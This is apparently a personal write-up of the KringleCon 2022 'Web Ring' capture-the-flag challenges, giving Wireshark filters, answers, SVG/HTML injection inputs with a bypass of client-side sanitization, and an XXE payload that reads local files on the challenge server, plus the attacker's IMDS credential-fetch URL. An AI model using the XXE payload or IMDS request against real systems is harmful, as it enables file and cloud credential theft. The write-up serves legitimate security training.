---
layout: kringlecon2022
title: "Web Ring"
author: "Andrew Cherney"
date: 2023-01-15 19:52:13
tags: kringlecon html xxe
---
## 404 FTW
***
___
The next attack is forced browsing where the naughty one is guessing URLs. What's the first successful URL path in this attack?  

***

There is likely an easy way to filter for this but you are looking for `404 NOT FOUND` http responses from the server, or `[PSH,ACK]` TCP responses from the server

`(http.response.code == 200 && ip.dst == 18.222.86.32 ) || ip.src == 18.222.86.32 && http`
this filters to 200 response codes and http requests from the host in question, scroll till you see a response after a get request


Answer: `/proc`

___




## Boria Mine 
***
___
Open the door to the Boria Mines. Help Alabaster Snowball in the Web Ring to get some hints for this challenge.

***

Connecting color sensors with proper characters
Spaces denote the next line
So in order to complete this challenge I need to color pick the color sensors and match their color with `<font color = >`

blue: 0200ff  
red: ff0001  
green: 01ff02  

1: ─────────────  
No filters

2: ───────────── ██──────────┐ ───────────┐├ ────────────├  
No filters

3: `<font color="#0200ff">███████████┼█ ███████████┼█ ███████████┼█ ██████┼████┼█ ██████┼████┼█</font>`  
Does not allow custom styles

4: `<style>div {background-color: blue;transition: background-color 5s;}</style><font color="#01ff02">█████████████</font> <font color="#ff0001">███████████┼█ ███████████┼█</font>`  
Does not allow custom styles

5: 
Does not allow custom styles, and filters out <> 

6: 
Does not allow custom styles, and filters out <> 


```<style>test {background-color: blue;transition: background-color 5s;}</style>```

```<test><font color="#01ff02">█████████████</font> <font color="#ff0001">███████████┼█ ███████████┼█</font></test>```

The above produces the following:

<style>
test {
    background-color: red;
    transition: background-color 5s;
}
</style>

<test><font color="#0200ff">███████████┼█ ███████████┼█ ███████████┼█ ██████┼████┼█ ██████┼████┼█</font></test>
<br>

svg makes this so much easier

1: `<svg width=250" height="250"><rect width="1000" height="1000" style="fill:rgb(255,255,255);stroke-width:10;stroke:rgb(255,255,255)" /></svg>`

2: `<svg width=250" height="250"><rect width="1000" height="1000" style="fill:rgb(255,255,255);stroke-width:10;stroke:rgb(255,255,255)" /></svg>`

3: `<svg width=1000" height="1000"><rect width="1000" height="1000" stroke="blue" fill="blue" /></svg>`

4: `<svg width=1000" height="1000"><rect width="1000" height="1000" stroke="blue" fill="blue" /><rect width="1000" height="50" fill="#01ff02"" /><rect x="0" y="50" width="1000" height="50" fill="#ff0001"" /><rect x="150" y="80" width="1000" height="50" fill="#ff0001"" /></svg>`

5: `<svg width=1000" height="1000"><rect width="1000" height="1000" stroke="blue" fill="blue" /><rect x="0" y="0" width="1000" height="50" fill="#ff0001"" /><rect x="0" y="50" width="10" height="1000" fill="#ff0001"" /></svg>`
`%3Csvg%20width=1000%22%20height=%221000%22%3E%0A%20%20%3Crect%20width=%221000%22%20height=%221000%22%20stroke=%22blue%22%20fill=%22blue%22%20/%3E%0A%20%20%3Crect%20x=%220%22%20y=%220%22%20width=%221000%22%20height=%2250%22%20fill=%22#ff0001%22%22%20/%3E%0A%20%20%3Crect%20x=%220%22%20y=%2250%22%20width=%2210%22%20height=%221000%22%20fill=%22#ff0001%22%22%20/%3E%0A%3C/svg%3E`

this pin is sanitizing inputs to remove `'"<>` but it sanitized user side which means i can change the `inputTxt=` data in the packet

6: `<svg width=1000" height="1000"><rect width="1000" height="1000" stroke="blue" fill="blue" /><rect x="0" y="0" width="1000" height="50" fill="#FFF"" /></svg>`
`%3Csvg%20width=1000%22%20height=%221000%22%3E%0A%20%20%3Crect%20width=%221000%22%20height=%221000%22%20stroke=%22blue%22%20fill=%22blue%22%20/%3E%0A%20%20%3Crect%20x=%220%22%20y=%220%22%20width=%221000%22%20height=%2250%22%20fill=%22#FFF%22%22%20/%3E%0A%3C/svg%3E`

same thing for this pin

___




## Credential Mining
***
___
The first attack is a brute force login. What's the first username tried?

***
search for the first login from the IP address for the first question


```ip.src == 18.222.86.32 && http.request.method == "POST"```


```18.222.86.32 - - [05/Oct/2022 16:46:12] "GET /login.html HTTP/1.1" 200 -
```

Look for first login POST and follow the tcp stream to see username and password

Answer: alice

___



## Glamtariel's Fountain
***
___
Stare into Glamtariel's fountain and see if you can find the ring! What is the filename of the ring she presents you? Talk to Hal Tandybuck in the Web Ring for hints.

***

Focus on capitalized word?
tamper path traffic flies type app

trying XXE injection in path gets a specific response

"I keep a list of all my rings using a simple format"
Then mentions a ring list

\<?xml version="1.0" encoding="UTF-8" ?>
\<!DOCTYPE replace[\<!ENTITY xxe SYSTEM "file:///app/static/images/ringlist.txt" >]>
\<root>
  \<imgDrop>&xxe;\</imgDrop>
  \<who>princess\</who>
  \<reqType>xml\</reqType>
\</root>


took some brute forcing but i found it
gives an image
bluering.txt
redring.txt
x_phial_pholder_2022

use xxe some more
file:///app/static/images/x_phial_pholder_2022/silverring.txt

a new visit png redring-supersupersecret928164.png

goldring_to_be_deleted.txt

she responds with 'bold REQ' which seems pointed

probably changing the \<reqtype> data

what it wanted us to do was put the payload there

Note: putting payload in who will yield a funny message

___




## IMDS, XXE, and Other Abbreviations
***
___
The last step in this attack was to use XXE to get secret keys from the IMDS service. What URL did the attacker force the server to fetch?

***
search by XML
find the last XML request


Answer: `http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`

___




## Naughty IP
***
___
Use the artifacts from Alabaster Snowball to analyze this attack on the Boria mines. Most of the traffic to this site is nice, but one IP address is being naughty! Which is it? Visit Sparkle Redberry in the Tolkien Ring for hints.

***
Look for the IP address that is attempting to login over and over (hinted at by next question)

Answer: 18.222.86.32

___











